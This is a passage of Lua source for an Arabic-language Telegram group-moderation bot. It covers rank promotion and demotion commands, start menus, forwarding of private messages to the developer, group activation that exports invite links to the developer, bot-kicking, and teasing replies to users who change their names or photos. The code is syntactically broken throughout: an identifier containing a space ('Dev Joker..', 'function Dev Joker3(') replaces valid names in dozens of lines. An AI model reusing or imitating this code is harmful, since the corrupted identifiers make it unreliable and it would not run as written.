elseif mrabs == "ادمن" and is_admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
info = "⌁︙*المعرف غير صحيح*"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") and ChCheck(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and is_admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
info = "⌁︙*المعرف غير صحيح*"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source Joker     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevAbs:incr(Dev Joker..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
ChatType = 'sp' 
elseif id:match("^(%d+)") then
DevAbs:sadd(Dev Joker..'bot',msg.sender_user_id_)  
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source Joker     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if is_leader(msg) then 
local Sudo_Welcome = '⌁︙مرحبا عزيزي المطور \n⌁︙انت المطور الاساسي هنا \n⌁︙اليك ازرار سورس فكتور \n⌁︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','↫ تحديث ⌁','ضع كليشه المطور'},
{'↫ المجموعات ⌁','↫ المطورين ⌁','↫ الاحصائيات ⌁'},
{'↫ تعطيل التواصل ⌁','↫ تفعيل التواصل ⌁'},
{'↫ المجموعات ⌁','روابط المجموعات','↫ المشتركين ⌁'},
{'تنظيف المجموعات','↫ قائمه العام ⌁','تنظيف المشتركين'},
{'↫ اذاعه عام ⌁','↫ اذاعه خاص ⌁'},
{'↫ اذاعه عام بالتوجيه ⌁','↫ اذاعه خاص بالتوجيه ⌁'},
{'⌯ ❨ تعيين كلايش الاوامر ❩ ⌯'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'نسخه ملف السورس','تحديث السورس','جلب نسخه المجموعات'},
{'↫ حذف رد عام ⌁','↫ الردود العام ⌁','↫ اضف رد عام ⌁'},
{'↫ حذف رد الخاص ⌁','↫ تعيين رد الخاص ⌁'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغيير كليشه الاشتراك'},
{'↫ تعطيل المغادره ⌁','↫ تفعيل المغادره ⌁'},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
if ChatType == 'pv' then 
if text == '⌯ ❨ تعيين كلايش الاوامر ❩ ⌯' then 
if is_leader(msg) then 
local Sudo_Welcome = '⌁︙اهلا بك مجددا عزيزي المطور \n⌁︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس فكتور فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end

if ChatType == 'pv' then 
if text == '/start' then  
if not DevAbs:get(Dev Joker..'Start:Time'..msg.sender_user_id_) then
local inline = {{{text="⌁ ︙ المطور ︙ ⌁",url="t.me/"..(DevUser or "BLACK_TEAM_4")}}}
local start = DevAbs:get(Dev Joker.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..name_bot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
send_inline(msg.chat_id_,Start_Source,nil,inline)
end
DevAbs:setex(Dev Joker..'Start:Time'..msg.sender_user_id_,300,true)
return false
end 
end
if text and DevAbs:get(Dev Joker..'Start:Bots') then
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevAbs:del(Dev Joker..'Start:Bots') 
return false
end
DevAbs:set(Dev Joker.."Start:Bot",text)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الستارت', 1, 'md')
DevAbs:del(Dev Joker..'Start:Bots') 
return false
end
if is_leader(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌁' then 
DevAbs:set(Dev Joker..'Start:Bots',true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌁' then 
DevAbs:del(Dev Joker..'Start:Bot') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevAbs:get(Dev Joker.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..name_bot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
end
--     Source Joker     --
if ChatType == 'pv' then 
if not is_leader(msg) and not DevAbs:sismember(Dev Joker..'BaN:In:User',msg.sender_user_id_) and not DevAbs:get(Dev Joker..'Texting:In:Bv') then
Dev_Abs(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..DevUser..')', 1, 'md') 
tdcli_function({ID ="GetChat",chat_id_=DevId},function(arg,chat)  
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
sendText(DevId,'⌁︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if is_leader(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Text = '⌁︙العضو ↫ ❨ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..') ❩'..'\n⌁︙تم حظرة من التواصل'
sendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:sadd(Dev Joker..'BaN:In:User',data.id_)  
return false  
end 
if text == 'الغاء الحظر' then
local Text = '⌁︙العضو ↫ ❨ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..') ❩'..'\n⌁︙تم الغاء حظرة من التواصل'
sendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:srem(Dev Joker..'BaN:In:User',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙فشل ارسال رسالتك لان العضو قام بحظر البوت', 1, 'md')
return false  
end 
if text then
Dev_Abs(id_user, 0, 1, text, 1, "md")  
Text = '⌁︙تم ارسال الرسالة الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '⌁︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '⌁︙تم ارسال الصورة الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '⌁︙تم ارسال المتحركة الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '⌁︙تم ارسال البصمة الى ↫ ⤈'
end     
sendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
if is_leader(msg) then
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌁' then   
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'Texting:In:Bv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌁' then  
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'Texting:In:Bv',true) 
end
end
--     Source Joker     --
DevAbs:sadd(Dev Joker.."groups:users" .. msg.chat_id_, msg.sender_user_id_)
DevAbs:incr(Dev Joker.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
DevAbs:del(Dev Joker.."bot:enable:" .. msg.chat_id_)
DevAbs:srem(Dev Joker.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end
end
getChannelFull(chat_id,promote_admin)
end
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(Dev Joker..'lock:bot:ttt'..bot_id) and not DevAbs:get(Dev Joker.."lock:bot:ttt2:"..msg.chat_id_) then 
function ABS_PROX(extra,result,success)
if result.id_ then 
local abbs = DevAbs:get("ABS_PROX:name"..result.id_)
if not result.first_name_ then 
if abbs then 
DevAbs:del("ABS_PROX:name"..result.id_) 
end
end
if result.first_name_ then 
if abbs and abbs ~= result.first_name_ then 
local abs_text = {
"اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
"وفف اسمكك الجديد يشكك، 🤤♥️ ",
"ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
"اسمك الجديد { "..result.first_name_.." }\n فد شي وين زخرفته ؟، 🤤♥️", 
}
abbss = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevAbs:set("ABS_PROX:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, ABS_PROX)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
DevAbs:set(Dev Joker.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(Dev Joker.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(Dev Joker.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(Dev Joker.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
DevAbs:sadd(Dev Joker..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbs:sadd(Dev Joker..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Dev Joker) then 
DevAbs:srem("ABS_PROX:addg"..bot_id, msg.chat_id_) 
DevAbs:del(Dev Joker.."bot:enable:"..msg.chat_id_)
function ABS_PROX(extra,result,success) 
function  reslit(f1,f2)
function Dev Joker3(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = DevId },function(arg,chat)  
Dev_Abs(tostring((DevAbs:get(Dev Joker.."bot:leader:gr") or DevId)), 0, 1, "⌁︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي الطردني ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙معرف الطردني ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n⌁︙تم حذف جميع بياناتها\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").." \n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, Dev Joker3, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, ABS_PROX)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end   
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(Dev Joker..'lock:bot:ttt'..bot_id) and not DevAbs:get(Dev Joker.."lock:bot:ttt2:"..msg.chat_id_) then  
function ABS_PROX(extra,result,success)
if result.id_ then 
local abbs = DevAbs:get("ABS_PROX:Userr"..result.id_)
if not result.username_ then 
if abbs then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بسرعه، 😹💔 \nهذا معرفه @"..abbs.."", 1, 'html')
DevAbs:del("ABS_PROX:Userr"..result.id_) 
end
end
if result.username_ then 
if abbs and abbs ~= result.username_ then 
local abs_text = {
'معرفك الجديد عشره بربع محد ياخذه😹💔',
"هاها غيرت معرفك نشروك بقناة فضايح😹💔💭",
"معرفك الجديد حلو منين خامطه؟!🤤♥️",
"معرفك القديم @"..result.username_.." ضمه بقناة لاينبعص، 😹♥️",
}
abbss = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevAbs:set("ABS_PROX:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, ABS_PROX)
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(Dev Joker..'lock:bot:ttt'..bot_id) and not DevAbs:get(Dev Joker.."lock:bot:ttt2:"..msg.chat_id_) then  
function abbs(extra,result,success)
if result.id_ then 
local abbs2 = DevAbs:get("abbs:photo"..result.id_)
if not result.profile_photo_ then 
if abbs2 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف كل صوره مضروب بوري، 😹💔", 1, 'html')
DevAbs:del("abbs:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if abbs2 and abbs2 ~= result.profile_photo_.big_.persistent_id_ then 
local abbs_text = {
"وفف مو صوره غنبلةة، 🤤♥️",
"طالع صاكك بالصوره الجديده ممكن نرتبط؟ ، 🤤♥️",
"حطيت صوره جديده عود شوفوني اني صاكك بنات، 😹♥️",
"اححح شنيي هالصوره الجديده، 🤤♥️",
}
abbs3 = math.random(#abbs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abbs_text[abbs3], 1, 'html')
end  
DevAbs:set("abbs:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, abbs)
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
function title_name(GroupID)
tdcli_function({ID ="GetChat",chat_id_=GroupID},function(arg,data)
DevAbs:set(Dev Joker..'group:name'..GroupID,data.title_) end,nil) return DevAbs:get(Dev Joker..'group:name'..GroupID) end
--     Source Joker     --
res = 'https://api.telegram.org/bot'..TokenBot
function Mute_time(chat_id,user_id,time)
local mut = res.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
return https.request(mut)
end
--     Source Joker     --
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
function ababes(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if ChatType == 'sp' or ChatType == 'gp'  then
if text ==('تفعيل') and not is_SudoBot(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'lock:bot:free'..bot_id) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
DevAbs:del(Dev Joker..'abs:absmonsh:'..msg.chat_id_)
local admins = result.members_  
for i=0 , #admins do   
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(Dev Joker.."abs:monsh:"..msg.chat_id_,owner_id)
DevAbs:sadd(Dev Joker.."abs:absmonsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(Dev Joker.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المجموعة ،بالتاكيد ،مفعلة', 1, 'md')
else
Text = '⌁︙اهلا عزيزي ↫ ['..CatchName(result.first_name_,15)..'](tg://user?id='..result.id_..') \nلقد تم تفعيل المجموعة بنجاح \nتم رفع الادمنيه ومنشئ المجموعه \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
openChat(msg.chat_id_,ABS_PROX)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
function ABS_PROX(f1,f2)
function Dev Joker3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end
end
DevAbs:set(Dev Joker.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "لايوجد")) 
Dev_Abs(tostring((DevAbs:get(Dev Joker.."bot:leader:gr") or DevId)), 0, 1, "⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي الضافني ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙معرف الضافني ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ "..(t2.invite_link_ or "لايوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").." \n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, Dev Joker3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
DevAbs:set(Dev Joker.."bot:enable:"..msg.chat_id_,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
end end
getUser(msg.sender_user_id_,adding) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تفعيل هذه المجموعة بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end end 
end 
end 
--     Source Joker     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
ababes(data.message_,data) 
--     Source Joker     --
if msg.date_ < (os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source Joker     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevAbs:set(Dev Joker..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Joker     --
local idf = tostring(msg.chat_id_)
if not DevAbs:get(Dev Joker.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
--     Source Joker     --
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
--     Source Joker     --
DevAbs:incr(Dev Joker.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
DevAbs:sadd(Dev Joker.."bot:groups",msg.chat_id_)
end
if not DevAbs:sismember(Dev Joker.."bot:groups",msg.chat_id_) then
DevAbs:sadd(Dev Joker.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not DevAbs:sismember(Dev Joker.."bot:userss",msg.chat_id_) then
DevAbs:sadd(Dev Joker.."bot:userss",msg.chat_id_)
end
else
if not DevAbs:sismember(Dev Joker.."bot:groups",msg.chat_id_) then
DevAbs:sadd(Dev Joker.."bot:groups",msg.chat_id_)
end
end
end
--     Source Joker     --
-------- MSG TYPES ---------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     Source Joker     --
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     Source Joker     --
if msg.content_.ID == "MessageChatAddMembers" then
DevAbs:incr(Dev Joker..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
DevAbs:incr(Dev Joker.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
DevAbs:incr(Dev Joker.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
DevAbs:incr(Dev Joker.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAudio" then
DevAbs:incr(Dev Joker.."Audio:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
